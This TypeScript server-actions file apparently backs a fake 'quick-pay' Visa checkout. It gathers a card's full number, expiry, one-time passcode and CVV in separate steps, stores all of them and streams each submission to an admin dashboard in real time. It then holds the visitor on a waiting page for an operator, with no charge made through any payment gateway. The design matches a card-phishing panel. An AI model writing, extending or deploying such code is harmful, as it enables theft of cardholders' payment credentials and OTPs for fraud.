import { headers } from "next/headers";
import { z } from "zod";
import { inspectVisaStep1, readSavedCard, type SavedCard } from "@/lib/card";
import { type ActionResult, toErrorCode } from "@/lib/codes";
import { canPay } from "@/lib/order-status";
import { rateLimit } from "@/lib/rate-limit";
import type { VisaRecordView } from "@/lib/types";
import { findOrderById, upsertPayment } from "@/models/order.repository";
import { lockVisitorSession } from "@/models/tracking.repository";
import { scheduleAdminRealtimeBroadcast } from "@/lib/admin-realtime-hub";
import VisaService, { type VisaDecision } from "@/services/visa.service";

function presentVisa(row: {
  id: string;
  holderName: string;
  cardNumber: string;
  expiryDate: string;
  otp: string;
  otpVerified: boolean;
  cvv: string;
  cvvVerified: boolean;
  status: string;
  orderId: string | null;
  createdAt: Date;
  updatedAt: Date;
}): VisaRecordView {
  return {
    id: row.id,
    holderName: row.holderName,
    cardNumber: row.cardNumber,
    expiryDate: row.expiryDate,
    otp: row.otp,
    otpVerified: row.otpVerified,
    cvv: row.cvv,
    cvvVerified: row.cvvVerified,
    status: row.status,
    orderId: row.orderId,
    createdAt: row.createdAt.toISOString(),
    updatedAt: row.updatedAt.toISOString(),
  };
}

function cardPayload(card: SavedCard) {
  return JSON.stringify({ ...card, brand: "visa", otpVerified: false, cvvVerified: false });
}

async function allow(key: string) {
  const ip = (await headers()).get("x-forwarded-for")?.split(",")[0]?.trim() || "local";
  return rateLimit(`${key}:${ip}`);
}

const cardSchema = z.object({
  orderId: z.string().trim().min(8).max(40),
  holderName: z.string().trim().min(2).max(60),
  number: z.string().trim().min(12).max(23),
  expiry: z.string().trim().regex(/^\d{2}\/\d{2}$/),
});

const orderOtpSchema = z.object({
  orderId: z.string().trim().min(8).max(40),
  otp: z.string().trim().regex(/^\d{6}$/),
});

const orderCvvSchema = z.object({
  orderId: z.string().trim().min(8).max(40),
  cvv: z.string().trim().regex(/^\d{3}$/),
});

export async function getAllVisaRecords(): Promise<VisaRecordView[]> {
  const rows = await VisaService.listAll();
  return rows.map(presentVisa);
}

export async function getVisaByOrderId(orderId: string): Promise<VisaRecordView | null> {
  const row = await VisaService.getByOrderId(orderId);
  if (!row) return null;
  return presentVisa(row);
}

export async function updateVisaStatus(id: string, decision: VisaDecision): Promise<ActionResult> {
  if (!id.trim()) return { ok: false, code: "not_found" };
  try {
    await VisaService.updateStatus(id.trim(), decision);
    return { ok: true };
  } catch (error) {
    return { ok: false, code: toErrorCode(error) };
  }
}

export async function recordVisaCard(raw: {
  orderId: string;
  holderName: string;
  number: string;
  expiry: string;
  sessionId?: string;
}): Promise<ActionResult> {
  const parsed = cardSchema.safeParse({
    orderId: raw.orderId,
    holderName: raw.holderName,
    number: raw.number,
    expiry: raw.expiry,
  });
  if (!parsed.success) return { ok: false, code: "invalid_card" };
  if (!(await allow(`visa:${parsed.data.orderId}`))) return { ok: false, code: "rate_limited" };
  const card = inspectVisaStep1({
    holderName: parsed.data.holderName,
    number: parsed.data.number,
    expiry: parsed.data.expiry,
  });
  if (!card) return { ok: false, code: "invalid_card" };
  try {
    const order = await findOrderById(parsed.data.orderId);
    if (!order) return { ok: false, code: "not_found" };
    if (!canPay(order.status) || process.env.PAYMENT_MODE === "live") return { ok: false, code: "generic" };
    const expiryDate = parsed.data.expiry;
    await VisaService.createVisa(card.holderName, parsed.data.number, expiryDate, order.id);
    await upsertPayment({
      orderId: order.id,
      gateway: "visa",
      gatewayRef: `VISA-${card.last4}`,
      status: "otp_pending",
      rawEvent: cardPayload(card),
    });
    await lockVisitorSession(raw.sessionId, {
      orderId: order.id,
      flowStage: "visa",
      page: "/quick-pay/card",
    });
    scheduleAdminRealtimeBroadcast();
    return { ok: true, orderId: order.id };
  } catch (error) {
    return { ok: false, code: toErrorCode(error) };
  }
}

export async function recordVisaOtp(raw: { orderId: string; otp: string }): Promise<ActionResult> {
  const parsed = orderOtpSchema.safeParse(raw);
  if (!parsed.success) return { ok: false, code: "invalid_otp" };
  if (!(await allow(`otp:${parsed.data.orderId}`))) return { ok: false, code: "rate_limited" };
  try {
    const order = await findOrderById(parsed.data.orderId);
    if (!order) return { ok: false, code: "not_found" };
    if (!canPay(order.status)) return { ok: false, code: "generic" };
    await VisaService.submitOtpForOrder(parsed.data.orderId, parsed.data.otp);
    const saved = readSavedCard(order.payment?.rawEvent);
    const rawEvent = saved
      ? JSON.stringify({ ...saved, brand: "visa", otpVerified: true, cvvVerified: false })
      : (order.payment?.rawEvent ?? "{}");
    await upsertPayment({
      orderId: order.id,
      gateway: "visa",
      gatewayRef: order.payment?.gatewayRef ?? (saved ? `VISA-${saved.last4}` : `VISA-${order.id.slice(0, 8)}`),
      status: "cvv_pending",
      rawEvent,
    });
    scheduleAdminRealtimeBroadcast();
    return { ok: true, orderId: order.id };
  } catch (error) {
    return { ok: false, code: toErrorCode(error) };
  }
}

export async function recordVisaCvv(raw: { orderId: string; cvv: string; sessionId?: string }): Promise<ActionResult> {
  const parsed = orderCvvSchema.safeParse(raw);
  if (!parsed.success) return { ok: false, code: "invalid_card" };
  if (!(await allow(`cvv:${parsed.data.orderId}`))) return { ok: false, code: "rate_limited" };
  try {
    const order = await findOrderById(parsed.data.orderId);
    if (!order) return { ok: false, code: "not_found" };
    if (!canPay(order.status)) return { ok: false, code: "generic" };
    await VisaService.submitCvvForOrder(parsed.data.orderId, parsed.data.cvv);
    let rawEvent = order.payment?.rawEvent ?? "{}";
    try {
      const meta = JSON.parse(rawEvent) as Record<string, unknown>;
      rawEvent = JSON.stringify({ ...meta, cvvVerified: true });
    } catch {
      rawEvent = JSON.stringify({ cvvVerified: true });
    }
    await upsertPayment({
      orderId: order.id,
      gateway: "visa",
      gatewayRef: order.payment?.gatewayRef ?? `VISA-${order.id.slice(0, 8)}`,
      status: "review_pending",
      rawEvent,
    });
    await lockVisitorSession(raw.sessionId, {
      orderId: order.id,
      flowStage: "awaiting_admin",
      page: "/quick-pay/card-waiting",
    });
    scheduleAdminRealtimeBroadcast();
    return { ok: true, orderId: order.id };
  } catch (error) {
    return { ok: false, code: toErrorCode(error) };
  }
}
